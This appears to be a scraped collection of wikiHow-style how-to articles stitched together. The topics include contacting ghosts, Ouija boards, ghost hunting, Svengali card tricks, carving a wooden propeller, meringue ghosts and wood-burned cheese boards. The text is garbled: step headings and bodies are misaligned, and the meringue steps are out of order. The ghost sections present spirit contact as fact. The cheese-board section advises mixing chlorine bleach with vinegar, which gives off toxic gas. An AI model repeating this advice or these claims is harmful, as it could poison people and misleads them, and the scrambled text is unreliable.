Resist the urge to categorize people and situations in advance. Wait until you're experiencing something to decide whether it's good or bad, then reflect on how the opportunity arose (usually through a series of decisions, not anything paranormal).

Try channeling with an experienced medium.,
Try scrying.,
Try mirror gazing.,
Use your car to communicate.",How to Talk to Ghosts3," If you want to take your communications to the next level, it's possible to visit an experienced medium and undergo a channeling session, in which one of the group (probably the medium) allows themselves to be ""inhabited"" by the spirit during hypnosis, who then talks to the group.


Depending on the medium you visit, the communication may involve writing, speaking, or other forms of communication.
It's very important that you visit someone experienced in the matters of afterlife communication. Do not try this alone.


, Scrying refers to any basic method of using a substance or an object to communicate with the other world. Most often, this means crystals, candles, smoke, stones, bones, or glass. Like channeling, scrying is most often effective when done with an accomplished and experienced medium who maintains frequent contact with the spiritual realm. It's difficult to know how to ""read"" smoke, for example, and might be somewhat dangerous to try., Many famous kids' games revolve around the legend of Bloody Mary, in which you shut yourself in the dark bathroom and invite Bloody Mary to appear in the mirror. Staring deep into a mirror and attempting to communicate with the spiritual world after cleansing the area and creating a safe, benevolent space for the spirits to gather can be an intense and mystical experience.

, In may places, especially the American South, legends revolve around the use of cars parked in specific locations in neutral, allowing spirits to ""push"" the car to let their presence be known. In some such legends, the driver is instructed to go to a particular location at midnight and put baby powder or flour on the bumper of the car, to show the handprints of the dead who pushed it.


If there's such a legend in your area, try it out. Drive to the particular place, bridge, or crossroad and kill your car. Put it in neutral and invite the ghost or the spirit to give you a push. See what happens.

Purchase or create a dowsing crystal.,
Dangle the crystal over a flat surface.,
Determine “yes” and “no” answers.,
Begin asking questions.,
End the session.",How to Talk to Spirits2," A dowsing crystal is a crystal that’s hanging on the end of a string or chain. You should feel a sense of attachment to the crystal when you hold it.This indicates that your energy is in tune with the crystal. To find a good dowsing crystal:


Visit a specialty herb shop and pick out a crystal. Hold each one to find one that “speaks” to you.
Use a crystal necklace that was owned by a deceased loved one.
Tie a piece of string around a crystal that you have owned for years.

, Hold the end of the chain in your dominant hand.Next, dangle the crystal over a hard surface, such as a table or the floor. The crystal should be near the surface, but not touching it.


Some people prefer to dangle the crystal over a circle drawn on a piece of paper. This can help you track the movements of the crystal.

, Gently swing the crystal once or twice. Holding your hand steady, ask the spirits to show you a “yes” answer. Make a note of the pattern that the crystal follows. Once the crystal is still, repeat the process, asking for a “no” answer.This pattern may change from session to session.

, Ask yes or no questions and take note of the answers. For example, if you’re trying to contact a particular spirit, you might ask: “Is your name Sandra Burdoch?” The spirit will then direct the crystal in a yes or no formation.


Take any messages received with a grain of salt. Some spirits may try to trick you or they may even be confused.Be polite when talking with spirits and treat them with respect.

, Thank the spirit for speaking with you. Politely ask them to return to the spirit world.Next, set the crystal down. Center yourself in the present by eating some food or having a cup of tea.


If you feel a presence lingering after you’ve ended the session, burn some sage incense to cleanse the room.

Purchase or make a Ouija board.,
Gather a few friends.,
Set up the Ouija board.,
Summon a spirit.,
Ask the spirit questions.,
Learn to recognize bad spirits.,
Close the connection.",How to Talk to Spirits3," Ouija boards can be bought online or from specialized novelty shops. Occasionally, rare and ornate Ouija boards can be found at estate sales or antique shops. To make your own Ouija board, write the alphabet, the numbers 1-9, “yes,” “no,” and “goodbye” on a large sheet of paper. Next, purchase a planchette or make your own.


The term planchette refers to the small wooden arrow used to navigate the Ouija board.
Planchettes can be purchased online or from specialized novelty shops.

, Never use a Ouija board alone. Instead, gather one or two friends to use the board with you.The presence of others will repel any cowardly malevolent spirits and bolster your courage.


Make sure your friends will take the process seriously. If they show a lack of respect, it could have bad consequences.

, Lay the board on a table or other flat surface. Next, place the planchette on top of the board. Ask your friends to sit around the table and lightly place their index and middle fingers on the planchette.


Relax your arms and fingers while touching the planchette. Otherwise, you may unconsciously move the planchette around on your own.

, Choose one person to be the medium, or the person who communicates with the spirit. Next, the medium should politely ask a spirit to visit. Wait patiently for the planchette to move. Once it starts moving independently, a spirit has appeared.This process can take several minutes.

, Once the spirit appears, the medium can begin asking questions. If you ask yes or no questions, the planchette will hover over the “yes” or “no” words on the board. If you ask more complex questions, the spirit may spell out words or even sentences. Consider asking questions such as:


”What’s your name?”
”Are you a ghost?”
”Do you have a message for us?”

, If the planchette moves randomly across the board without giving any clear answers, the spirit is not interested in helping you. If the planchette moves in a figure eight, the spirit is attempting to take control of the board. End the session immediately.If you begin to feel a lot of fear, end the session. Fear can invite negative spirits into the Ouija board.

, Guide the planchette over the word “goodbye” on the board. This will close the Ouija board’s connection to the spirit world. Once the session has ended, wrap the planchette in a piece of cloth and store it separately from the board.If you store the planchette and the board together, you risk unintentionally inviting spirits into your home.

Stack two paper cups together.,
Rest a small balloon on top.,
Cut 8 inches (20 cm) of cheesecloth.,
Soak the cheesecloth in fabric stiffener.,
Immediately drape the cheesecloth over the balloon.,
Pop the balloon once dry.,
Decorate the ghost.",How to Make a Ghost1," Create a base out of 8 oz (250 ml) paper drinking cups. Place the first cup on the table upside-down and stack the second cup, right-side-up, on top of the first.


If the structure seems unstable, you can strengthen it by taping the cups together. You only need this structure temporarily.;
, Inflate a small balloon and rest it inside the mouth of the top cup. The bottom should sit inside the cup, but the top should remain sticking out.


The color balloon you use does not matter since it will only be used temporarily.
Balloons meant for use as water balloons usually create the right size.

, The ends can be ragged. If anything, ragged ends will create a more realistic ghost.


Choose white cheesecloth over off-white or beige colors.

, Dunk the cheesecloth into a bowl of fabric stiffener, coating each side well.


Work quickly.
Pour the fabric stiffener into a wide, low bowl to make this process as easy as possible.

, As soon as you remove the cheesecloth from the fabric stiffener, you must drape it over the balloon placed in your paper cup stand.


The sides of the cheesecloth do not need to be precisely even, but they should be fairly similar in length.
Let the fabric stiffener on the cheesecloth dry. This should take about 10 minutes.

, Stick a needle through the cheesecloth to pop the balloon.


A hardened ""ghost"" shape should be left behind. Remove it from your paper cup stand.

, Use craft glue to fix two black felt circles on the ghost for eyes.


Let the glue dry.
Use your fingers to gently spread out and roughen the edges for a more ghost-like appearance.
Thread fishing line, thread, or twine through the top of the ghost. Tie a knot and hang it up as a decoration.

Never attempt to communicate with ghosts alone.,
Keep your intentions and your thoughts pure.,
Always be polite and calm while communicating.,
End the communication appropriately.",How to Talk to Ghosts4," No matter what you believe, it's best for your spiritual well-being and your psychological health to have other people present who are interested in participating. It's not something to fool around with.


It's best if you let more experienced communicators and mediums show you the ropes. Wandering into a conversation with evil spirits is something no one wants to experience.

, Make your intentions known by speaking them aloud and only try to communicate if you're coming from a place of legitimate curiosity and kindness in your heart. Doing a Ouija session as a joke to impress your friends is a good way to attract mean spirits to your house. They might not want to leave.

, Take some time to center yourself and calm your thoughts any time you hope to communicate. The experience will be much more intense and singular if you can focus on the task at hand and pay attention to your surroundings without distraction. Turn off the spooky music and close the shades, take the cell phone battery out of your phone, and turn off the computer. It's time for other concerns.

, Never let a conversation hang without making it clear that you are going back to your world and encouraging the spirit to go back to their world. Professional mediums and ghost hunters take this step very seriously, especially if they're in a domestic space and they want to remain safe from poltergeist activity. If you're smart, you'll do the same.

Create an indentation using a center punch.,
Determine the appropriate size bit for drilling your pilot hole.,
Drill the pilot hole.,
Install the screw.",How to Make a Pilot Hole," If it is crucial that the screw is installed in a precise location, you may want to mark the spot with a pencil on the material. Use a ruler to determine your intended location (usually by measuring the distance from the edge of the material's surface), tracing along the ruler with a pencil. At the desired distance along the line you drew, make a small mark with the pencil.;
, A punch is a small, slender tool with a pointed end that allows you to create a small indentation in the work surface. This indentation will help keep your drill bit from slipping when starting the pilot hole. Position the tip of the punch over your pencil mark, and then strike the punch gently with a hammer.

, As a general rule of thumb, your pilot hole should be slightly smaller than the diameter of your screw. This will remove as much material as possible, which will reduce the likelihood of splitting, but will still leave enough material for the screw's threads to grip into.


Exact recommendations for pilot hole diameters based on screw sizes can be looked up online. However, a visual check of your drill bit against the screw will suffice for most applications. It is best to err on the smaller side when choosing a bit; a pilot hole can always be made bigger, but not smaller.

, After choosing a bit and fitting it into your drill, position the tip of the bit into the indentation you created with the center punch. Holding the bit at the angle you want the screw positioned, drill the hole to a depth equal to the screw's length. Back the bit out carefully.

, Once the pilot hole is drilled, you can install the screw. Fit your drill with a screwdriver bit and position the screw's tip into the pilot hole. Drive the screw in, being careful to angle it to follow the path of the hole. Repeat this process for each screw used.

Learn the secret of the Svengali deck: the duplicate cards are all a little shorter than the other cards.,
Decide which trick to perform.,
Set up your deck with the ordinary cards alternating with the duplicate cards.
,
Learn some beginner tricks:

The Astonishing Prediction trick gives the illusion that you can predict what card a spectator will choose by writing it down before the trick starts.,
Learn some advanced tricks:

The Backed Up Card trick creates the illusion that the magician has messed up the trick, when he has actually done it perfectly.,
Learn some tricks that use a different set up.",How to Use the Svengali Deck," If you hold the deck with your thumb at the upper end and your fingers at the bottom end and allow the cards to flick off your thumb onto your other hand, you will find that the cards fall in pairs with the deck looking totally normal. This is called riffling the cards. When you riffle the cards, since the duplicates are a bit shorter, they will stay hidden behind the normal cards.
, You can only perform one trick at a time since you can only force one card (the duplicate) onto a spectator. If the same card is forced for multiple tricks, this will be very suspicious.,,
The Mind Blower trick gives the illusion you can find a spectator's card while dealing out the cards face down.
In the Blurt Out trick, you announce the spectator's card while shuffling it back into the deck, right after they choose it.
The Card in Pocket trick makes the spectator's card appear in your pocket, and anywhere else you want.
In the Find Your Own Card trick, the spectator picks their card from the deck after it has been shuffled and cut into many piles.

,
The Wet Tablecloth trick gives the illusion that the spectator's card traveled from the deck to sit underneath a tablecloth.
In the Picture Perfect trick, the spectator's card appears inside a picture frame.
In the Signed Card trick, the spectator's name is written on the card before it appears in an impossible location.
In the What is Your Name trick the spectator finds their card after spelling out their name with the cards. This trick can be expanded by using multiple objects/names and creating an amusing story around them.
In the Amusing Coincidence trick multiple spectators pick cards to be found.
Reversal! Before doing your show turn over the third card from the top of your deck (a duplicate) so that it is face up in the face down deck. Riffle though the cards and, as per usual, get a spectator to call out, ""Stop!"", and to look at the card they selected and to replace it. Be careful not to riffle too far as you do not want to expose the reversed card! Give the deck a cut or two or perform a riffle shuffle (Claim to be ""mixing up the cards"".). Spread the cards out either in your hand or across the table to show that the ""freely selected"" card has reversed in the deck!

Lie Detector! If you present this well you will find it to be a great trick with lots of laughs! Tell your spectator that you have been training yourself as a human lie detector and you are going to prove them just how good you are. Force a duplicate card onto the spectator and have them put it in their pocket. Explain to them that you are going to begin calling out cards at random and they are to say ""That's not my card,"" every time you say one, even if it is their card! Begin calling out cards and pretend to listen to their answer each time they say ""That's not my card"". Eventually call out the name of your force card and they will say ""That's not my card,"" then you shout, ""Liar!""

, For these tricks you will want to place all your duplicate cards on top of the ordinary cards.


Double Dilemma! Casually spread out the bottom half of the deck to show that all the cards are of different value. Now spread out the top half of the cards, face down, and let your spectator choose one. They will obviously chose one of the duplicates! Now ask another person to pick a card, but this time, only fan out the bottom half of the deck, so they take one of the indifferent cards. Now ask another portion to take a card, but they will take one of the cards from the bottom of the deck also. Now here comes the sneaky bit: You take the duplicate card and put it into the lower half of the deck, and the two indifferent cards go to the top of the deck with the duplicates. You can easily give the deck a couple of cuts because, since the duplicates are a little shorter than the other cards, you will be able to feel the top edge of the pack and cut the deck exactly so that the duplicates and indifferent cards are still in two separate groups! Give the deck a couple of cuts to, ""Make it impossible to find the cards!"" Look through the cards and you will easily be able to find a duplicate card and set it down on the table, face down. You will also easily be able to find the other two cards because they will be mixed in with the duplicates! Once all three cards are down on the table, turn them over to finish your miracle.



 


Very Ambitious Card! Once more start with all the duplicates on top of the indifferent cards. After showing the deck to be ""normal"" have a spectator pick a duplicate and return it among the top cards. Do a couple of cuts and say, ""I have a feeling you chose a very ambitious card, and it always returns to the top of the heap!"" Turn over the top card of the deck to show a duplicate card. They will, of course, believe it is their card! Say, ""I'm not kidding, it will always jump right back to the top!"" Take the card and put it in the middle of the deck (it does not matter where), then turn over the top card. It will, again, be a duplicate card! You can do this just a few times or so many times it drives your spectator crazy!
Stop the Presses! Most newspapers will have a free, or at least very reasonably priced advertising section. The week before your show take out an advert displaying the words ""(NAME OF CARD)"". Get a copy of the paper and have it lying around somewhere near the area in which you will be performing. Spread out the deck to show all the cards to be normal. After forcing one of your duplicate cards on a spectator, acknowledge an ad you saw in the paper today and how it was just the strangest thing. Open up the paper to reveal the most shocking revelation!

Form the arms.,
Create a base for the torso.,
Attach the head.,
Drape white fabric over the structure.,
Trim the arms.,
Create hands.,
Fill in the figure.,
Hang the ghost as a decoration.",How to Make a Ghost2," The arms form an essential part of the ghost's ""skeletal"" structure and are created with clothesline wire, a padded clothes hanger, and polyethylene foam pipe insulation.


Wrap the center portion of the wire around the padded portion of the hanger six times. Equal amounts of wire should hang off both ends.
Slip the foam insulation over each piece of wire hanging from the center of the hanger. Slide the insulation as far as it will go so that each piece is directly against the padding of the clothes hanger.
Use packing tap to hold the insulation in place.
Straighten out the hook of the hanger so that it can be used as the ""neck"" of the ghost later on.

, The torso is created by draping bubble wrap over your hanger.


Trim large rectangles of bubble wrap over the top of the hanger. Each piece should be the same size, and the overall length should be twice the length you want for your finished ghost.
Poke the straightened hook of the hanger through the center of the bubble wrap.
Start with one piece of wrap and gradually add on other layers.
Secure in place using packing tape.

, Place a plastic foam wig head on top of the hanger, pushing down so that the straightened hook sticks through the center bottom of the foam.


Secure with packing tape.

, Drape the center of the fabric over the center top of the head and let the rest hang down. Shred the bottom of the fabric with scissors to create a more ghost-like appearance.


Save any scraps of fabric you cut or rip off.
Use sheer white fabric or white fabric that has sheer pieces attached to it. Tulle works well, but other sheer, free-flowing fabrics work just as well.
If you have trouble working with the fabric while the ghost is flat, temporary suspend it using fishing line tied around the neck.

, Use wire cutters or sharp crafting scissors to trim the arms to an appropriate length.


Note that both sides of the clothesline wire arms should still be roughly equal to one another.

, Stuff white gloves with cotton balls until they appear full. Tape the gloves onto the sharp wire edges of the arms.


You can use plastic, rubber, or fabric gloves, but make sure to choose either clear or white gloves when making your choice.

, Glue scraps of torn fabric over the arms, head, and torso of the ghost.


Once thee fabric has been completely used up, cut and shred pieces of white trash bag to fill the ghost figure in instead.

, Thread fishing line or twine around the ghost's neck if you have not done so already. Use this line to hang the ghost from the ceiling, doorknob, or any other area you choose.

Add the sugar and continue mixing.,
Spoon the egg white into a pastry bag.,
Pipe 8 to 10 ghosts onto your baking sheet.,
Bake until dry.,
Melt the chocolate chips.,
Pipe the chocolate onto the cooled meringue ghosts.",How to Make a Ghost3," Meanwhile, prepare a baking sheet by lining it with parchment paper.


Note that the taste and consistency of meringue cookies are delicate, so you should not use cooking spray or aluminum foil to line the tray. Stick with parchment paper.

, Combine the two ingredients into a large metal or glass bowl and beat with an electric mixer on medium speed until frothy, soft peaks begin to form.


With ""soft peaks,"" the egg whites should be a solid, fluffy mass. When you remove the mixer from the egg whites, peaks or points should begin to form before deflating.
Glass and metal bowls are best when beating egg whites because they tend to hold less grease than plastic bowls. The presence of grease can prevent your egg whites from whipping up correctly.

, Sprinkle the sugar into your egg whites and continue beating at high speed for another 5 to 6 minutes, or until stiff peaks form.


With ""stiff peaks,"" the egg whites should form solid peaks or points when you remove the mixer. These peaks should hold their shape.

, Use a spoon or spatula to gently transfer the whipped egg whites into a pastry bag.


Make sure that the bag is fitted with a large, round tip.
Do not deflate or smash the egg whites into the bag since doing so will cause the air you just whipped into them to escape.

, Squeeze the egg whites out of the pastry bag and through the tip so that swirled ghosts are formed.


Apply the egg whites to the baking sheet using a swirling motion. Each ghost should be made from one continuous, upward-swirling line of piped meringue.
Swirl the meringue onto the sheet to form a spiral base, then gradually swirl the meringue in an upward tower shape so that the top is significantly thinner than the bottom of each ghost.

, This will usually take about 1 hour to 1 hour and 15 minutes.


Let cool on a wire rack before decorating.

, Place the chips in a microwave-save container and cook for 1 minute at 50 percent power.


Stir the chips halfway through to prevent burning.
Stir the partially melted chips after they come out of the microwave to melt any lumps that are still solid.

, Transfer the melted chocolate into a resealable plastic sandwich bag. Cut a small corner off and pipe the chocolate through that corner and onto your ghost in the shape of eyes.


Let the chocolate cool before displaying and serving.

Add a coat of clear enamel.",How to Make a Propeller," If possible, try to locate a design pattern for a propeller that will suit your needs. You will need to know the engine power, prop diameter and RPM's and see if you can find plans for a wooden propeller that is ideal for your specs. You can search for designs online, or try checking out a book at the local library. Some books have sample prop blueprints to get you started.;
, Most propellers have two, three, or four blades. Some large aircraft use propellers with even more blades. The more powerful the engine driving the propellers, the more propellers will be needed to distribute the power evenly.While it is possible to carve a three or four blade propeller, it is best to start by building a 2-blade propeller as it is easier for a beginner to construct. Adding blades adds cost, weight and building time., Similar to the amount of propeller blades, increasing the length of the blades can help to handle a more powerful engine. However, blade length can only be increased so much because the blades still need to clear the ground. Measure the distance between the nose and the ground to get an idea of your blade length limitations.

, A propeller blade is thick at the hub with a large blade angle and thin at the tip with a low blade angle.Determine the width of the blade and the angle of attack. Propeller blades are fixed to their hub at an angle, just as the thread on a screw makes an angle to the shaft., A propeller blade is like a wing with a twist. The twist of the blade makes the propeller more efficient at pushing air or water. This is because the speed of the propeller blade is much faster at the tip than at the hub. By twisting the blades, the propeller can maintain the same angle of attack across the length of the blades. To figure out the pitch you can use a prop calc.

, All well-built wood propellers are better at handling the aircraft vibrations,but you need to use a strong, light wood like maple or birch. Note the grain of the wood when you select your material. A straight grain that is uniform will help with balancing the prop.


Get about 6-8 planks that are 3/4 to 1-inch thick and about 2 meters long. You can use extra pieces that you cut. The more layers you have the stronger your prop will be. Even if the layers are very thin. To safe time you can try to find a lumber supplier that makes laminated wood planks that will suit your purpose.

, Now that you have determined how you want your propeller to look, create a pattern using a thick cardboard or poster board. Create the propeller in actual size. Include the center hole and draw a separate model for the pitch. Cut out the patterns. These will be used as guides for carving the prop.

, You will need pieces of wood of various lengths. The longest pieces of wood should be in the middle with the smallest pieces on the top.

, A propeller must have as much balance as possible in each blade to operate as desired. Each blade should be crafted to be uniform as the rest.

, You will need to use a very strong glue, like Resorcinol, to create aircraft propellers. Be sure there are no spaces or air between the wood. It may seem easier to use one large piece of wood, but you will have a stronger material by gluing a number of smaller pieces tightly together.

, Use a vice and a table to keep pressure on the boards while the adhesive dries. You may find that using several clamps at various parts of the board will do a better job of keeping out any air.

, Draw a line all the way around the shape of the blade. Mark the hole in the center.

, You may want to use a vice to secure the propeller while you work. If you don't have one you can tie down one side of the propeller to the table while you work on the other end to keep it secure.

, Mark the hole from you design cutout, then drill it with a one inch drill bit. The hole should be at close to the center of the wood, but doesn't need to be exact.

, Cut the wood around the shape of the propeller profile. Use as saw and cut as close to the lines that were traced on the wood as possible.

, Use the blade angle that was determined from the prop calc and mark off the shape of the pitch on the wood. Mark the pitch angle on the edge of the block of wood that would make the tip of the propeller blade. Then draw a line along the length of the blade to mark the twist of the blade. Repeat at the opposite end of the prop blade.

, Use a saw to cut off the bulk of the excess wood first. Then, use a chisel or belt sander to work the wood into the correct shape. Continue sanding until the blade is smooth.


Precision milling machines can take 60 passes to sand a propellerprecisely, so be prepared to spend some hours getting your propellers as close to perfect as possible.

, Flip the block over and repeat so you are carving off the excess wood on the bottom in the opposite corner.Be sure your blades are both curved in the same direction.

, Repeat carving the corners in a similar fashion for the other blade. Try to keep the propeller blades as smooth as possible. Go over the wood with a sander to get a nice flat surface on your blade.

, Put a straight bar through the center hole of the propeller and see if the wings will balance evenly at each end. If the prop stays straight with the blades perfectly horizontal, you have a well-balanced propeller.

, Enamel will help to seal in the propeller to protect it from weather and moisture. Spray a coat over the entire surface. Allow 24 hours to dry. If desired you can repeat and add a second coat.


You can also paint the tips a bright color like yellow or red to make the propeller more visible when spinning.

Houses that have housed lots of generations, old hospitals and public buildings, battleships and boardinghouses, and other historical sites are places in which you might reliably see ghosts. Places like Paris, London, New Orleans and Japan are known as particularly haunted areas because they've seen a lot of history.


Places without history like shopping malls or brand new housing developments are unlikely to be haunted, because they lack the kinds of traces of psychic activity that older locations that have seen more history. You want places that have psychic resonance, with the echoes of what's come before.;
, Most of the time, you shouldn't have to travel very far to find a ghost. Every town has a store of local haunts to check out. Go to your local library to look for books about local history and seek out spooky sites, talk to a librarian or sign up for a ghost tour if you live somewhere that has one. Find a list of places to check out later, when it gets dark.


If you live in a rural area, many hauntings revolve around particular crossroads, rail crossings, or abandoned bridges, as well as old cemeteries and murder sites.

, If you live in the US, consider making a ghost pilgrimage to:



The Stanley Hotel in Estes Park, Co, whose haunted Room 217 provided the basis for Stephen King's classic creepfest The Shining.

Lafitte's Blacksmith Shop in New Orleans, LA, where you can sidle up to the bar for a cold one and hope to spot a dead pirate or two.

Eastern State Penitentiary in Philadelphia, PA. In the city of Brotherly Love, this once-packed prison is now closed, but supposedly run by its former inhabitants.

, From Japan's Aokigahara forest, also known as the Suicide Forest, where over 500 people have died since the 1950s, to the Tower of London, England's notorious medieval prison, the world is full of famously haunted locales for you to visit. Check out:



The Beechworth Lunatic Asylum in Victoria Australia, where some 9,000 patients died during the history of the facility, from 1867-1995.

The Hell fire Club in Montpelier Hill, Ireland was originally built as a hunting lodge but has a long history of being used for demon worship and other ghost-conjuring history.

The Borley Rectory in Sudbury, UK has got everything. A tragic romance between monk and nun? Check. A creepy monastery built on an ancient druid burial ground? Check. This ruin is reportedly the most haunted house in all England.

Rose Hall in Jamaica is reportedly haunted by a dead voodoo priestess who makes bloodstains appear and disappear on the walls, and you can still stay there. If you want to sleep in the same place in which a woman tortured three husbands and committed human sacrifice., You don't have to plan a big trip to find ghosts. Look for places with lots of psychic trauma, places that spirits might have reasons to linger. Research murder sites, prisons, and other history of areas you're interested in checking out to find spooky legends you might investigate yourself.

,, If you've got a good location in mind and you'd like to spend some time checking for spooks, set out on your expedition during the hours between 9pm and 6am. This is the period of time during which most ghost activity is reported.


Try to explore the area some in the daylight, mapping out the locations you'd like to visit while you can still see everything easily. If you're going to a place that's not on your property, make sure you have permission to be there.

, Make sure you pack appropriately for the weather and that you bring all the necessary ghost hunting gear. Being out in the middle of the woods at 3am isn't the right time to remember you don't have any batteries. You'll want to bring:


Clothes appropriate to the weather
A map or schematic of the area, if you don't know it well
Digital camera
Sturdy flashlight
Some way to tell the time
Journal, or something to write in
Cell phone
Extra batteries and phone chargers

, When you're first out looking for ghosts, it can be a rush of different sorts of emotions. You might be really scared, or might be really giggly. Either way, you need to learn to calm down and control your thoughts and emotions. This isn't the time to goof off or play games, because you need to behave in a respectful way when dealing with the supernatural. You also don't want to miss any ghosts because you were talking about something else.


Slow your eye movements and scan the room slowly. Center yourself and your visual field, and starting getting some sense of the presence, keeping your eyes relaxed and receptive.

, You may not see ghosts so much as feel them. Pay attention to any odd sensations or experiences while you're looking for ghosts.


Look with your eyes and ears, listening closely for any whispering, rustling, or other noises that might suggest activity. You might consider bringing along a digital recorder to record any attempts at communication you might attempt to conduct with a ghost. You might not hear it at time, but the recorder might pick up evidence of something you'll be able to hear later.
Also feel around, using all your senses. Feel for warm or cold spots, common signs of supernatural phenomena. Pay attention to any sensations, subtle or otherwise, that you experience during the time that you're hunting ghosts.
Pay attention to your feelings as well. Be aware of any feelings of apprehension, or feelings that you're being watched. If you experience these things, begin recording the event, even if you're not ""seeing"" anything in particular. You're still having an experience.

, It's a common practice to video tape the ghost hunt with some kind of digital recording device, camera, cellphone, or otherwise. It's best to have a high-quality for examining later. Cellphone camera quality might not be up to snuff.


You might consider using a night-vision function on the camera, or using the natural light of your flashlights and other local lighting to give the footage a more realistic documentation. It's up to you.
You might consider assigning different tasks to different members of your group. If you're on video duty, who's going to be taking pictures? Who's going to be recording the events in the notebook? Who's going to be trying to ask questions to the room and communicate?

, You should always be taking pictures with a good quality digital camera. Again, especially in the dark, there's a lot of opportunity for you to miss things because you're emotional and distracted while you're out looking for ghosts. But, the camera won't lie. The camera also has the ability to give you the kind of incontrovertible evidence that you seek.


After you're done, examine your photos closely for any abnormalities, shades, or orbs you see floating in the photograph that you don't remember (or maybe do) from the occasion.

, Assemble a crew of like-minded thrill seekers and ghost hunters with which to form a spook-finding posse. Assign different tasks to each member and let everyone's family know where you went and what you're doing in case you run into trouble.

, Start the hunt and end the hunt by introducing yourself to the ghosts. It may sound silly, especially if you're skeptical, but it'll help ease the tension and make the possibility of experiencing phenomena much more possible if you're relaxed and at ease.


Let any human spirits you might encounter know that you come in peace and harmony, and that they remain in this place after you leave and not follow you home. Say a brief prayer if you'd like, or other short centering ritual you can perform with your group that'll keep everyone at ease and will reassure any spirits of your good intentions.

, Don't wander onto someone's private property and run afoul of angry spirits in the here-and-now. The last thing you need when you're on hyper-aware ghost patrol is some angry homeowner to rack a shotgun in your ear.

, If you're going to Try to communicate with any ghosts that you might encounter, be extremely careful and come from a place of intellectual curiosity and innocence. The spiritual world will see through the externals, so your intentions must be good if you're going to Try to speak with the dead.


If you're going to go ghost hunting, take it seriously. Messing with matters of life and death is nothing to joke about, even if you're somewhat skeptical. Lots of immature ghost hunters mask their initial fear with jokes and mock confidence. Don't let these fake ghost hunters sway you.

Draw your design onto the board with a pencil.,
Use other equipment to transfer your design.,
Warm up the woodburning tool.,
Trace your pencil lines.,
Stain the board naturally.",How to Make a Wood Burned Cheese Board1," After, you determine the design you wish to burn into your cheese board, figure out what other items you may need to draw the image. Simple geometric shapes often look best. If you go this route, use a ruler to guide your pencil for extra precision.Aside from phrases or recognizable iconography, consider doing a design around the edge of the board, or even something more creative, like a flock of geese flying across the board's surface.
Another good option: re-create a piece of childhood artwork that you or one of your kids made. Not only would the board have special meaning to your family, it may elicit some friendly chuckles as well.;
, For lettering or for classic designs, such as arrows or trees, you may want to get equipment that can provide a guide instead of creating the design free hand. For instance, use a stencil to simply trace a design onto the board. You can also use graphite paper to trace a more complicated design directly onto the wood.Stencils and graphite paper can be found as art supplies stores or online.

, Select a tip, attach it to the tool, and plug it in to heat it up. If the tool has a on/off switch, make sure it is engaged.Many wood burning tools come with several different types of tips. Depending on your design, you make want to use a pointed tip (ideal for making dots) or a tip similar to that on a flathead screwdriver (for making lines one tip-width at a time).
Woodburning tools, as well as additional tips, can be found online or in a most craft stores.

, Use the woodburning tool to press down firmly on the pencil lines you drew on the board. You may need to go over the lines more than once to make them sufficiently dark.Once you’ve completed the woodburning step, allow the board to cool down and erase any stray pencil lines.

, Before seasoning the wood to make it safe to use with food, you may want to stain the wood for aesthetic reasons. If you wish to do so, make a natural stain by mixing heavily concentrated coffee 1:1 with balsamic vinegar. Simply paint the solution onto the wood and allow if to dry to darken the wood and make it look older.To make heavily concentrated coffee, grind an amount you’d usually use to make a batch in your french press, but only add a cup or two of boiling hot water. Allow the coffee to steep into the water before straining and adding to the balsamic vinegar.

Choose a seasoning oil.,
Apply the oil liberally.,
Finish the board with a coat of beeswax.",How to Make a Wood Burned Cheese Board2," You need to season a new (or newly woodburned) cheese board before using it to cut and serve cheese. This will prevent the board from absorbing odor or bacteria and protect against germ and mold growth. Seasoning requires an initial application of oil, as well as periodic reapplication of oil to keep wood pores filled.Default to USP-grade mineral oil, especially for the board’s initial treatment. Not only is mineral oil cheap, it is safe, and it will not degrade. (Do not confuse mineral oil for mineral spirits.)
Mineral oil is also sometimes called paraffin oil, and can be found in apothecary stores, online, or your local hardware store. A cup of oil should be plenty to season your board.
Avoid using most vegetable or cooking oils, such as olive or canola oil, as these will spoil and go rancid.
Walnut, almond, or coconut oil will go rancid more slowly, but they will go rancid at some point. As such, these oils are best for re-seasoning a cheese board.

, Warm the oil you’re using to season your board before applying. Microwave about a cup of oil on high for 30 seconds. Dip a clean cloth in the oil, and apply it to the board in strokes that follow the direction of the wood’s grain. Allow the oil to soak into the wood between coats for about six hours, and wipe away any oil that remains on the surface of the wood.Repeat the process four or five times, until the wood seems fully saturated.
Re-season the board monthly with a fresh coat of oil. Don’t worry about using too much oil, simply wipe away the oil that doesn’t soak into the wood after six hours or so.

, Beeswax can either be added to the oil you use to season your board, or applied after seasoning to form a top coat. Either way, beeswax will help the wood resist water, as well as protect it from regular wear and tear.If blending beeswax into mineral oil, shave about a ½ teaspoon into a cup of mineral oil and microwave on high for 45 seconds. Always apply while the mixture is still warm.
To apply a topcoat, wipe a clean cloth onto a block of beeswax until the surface of the cloth contains beeswax with a consistency similar to shoe polish. Rub the cloth onto the cheese board, and buff until flat. Allow the beeswax to dry before buffing the board to an aromatic, durable shine.

"
"
Clean your board after every use.,
Avoid damaging your cheese board.,
Sanitize your board regularly.",How to Make a Wood Burned Cheese Board3," Use hot water and soap to clean your board, wiping with a soft-bristled brush or sponge. Rinse after washing and dry with a clean cloth.To remove persistent odors, rub coarse sea salt or baking soda onto the board and allow it to sit for a few minutes. Wipe the material away and rinse.
Rub a lemon slice onto the surface of your board to remove the scent of onion and garlic in particular.

, Incorrect storage is the most likely way to damage your cheese board. To avoid doing so, store the board somewhere dry, and stand it vertically without anything pressed flat against either side.When cleaning your board, never leave a wood cheese board submerged in water.
Further, never use a steel brush or steel wool to clean a wood cheese board.

, There are a few different ways to sanitize your board. Perhaps most popular, wipe the board with full-strength white vinegar. Keep the vinegar in a spray bottle and use it to sanitize the board after each cleaning.If you’re especially concerned about removing potential bacteria from your board, wipe it down with a paper towel soaked with 3% hydrogen peroxide after wiping the board with vinegar.
For an especially powerful sanitizing solution, mix liquid chlorine bleach with vinegar at a 1:5 ratio. Allow this mixture to soak on top of the board for a few minutes, then rinse and dry the board.

Make a custom-shaped cheese board.,
Purchase a plain cheese board.,
Select a board with wood grain you like.",How to Make a Wood Burned Cheese Board4," You can cut the cheese board you intend to wood burn. In order to do so, you’ll need an untreated hardwood plank, a jigsaw, and a powerful sander, among other items. You’ll start by drawing the shape of your cheese board onto the plank, avoiding any knots in the wood.After carefully cutting the board out with a jigsaw, sand all edges until smooth, ideally with an 80 grit material at first, and again with 220 extra fine grit.

, You may wish to purchase a plain cheese board and wood burn it with whatever design you wish. One factor to be aware of is the size and weight of your board. Think about things like counter space and most common uses of the board to help make your decision.Cheese boards can be found online and in kitchen supplies stores.

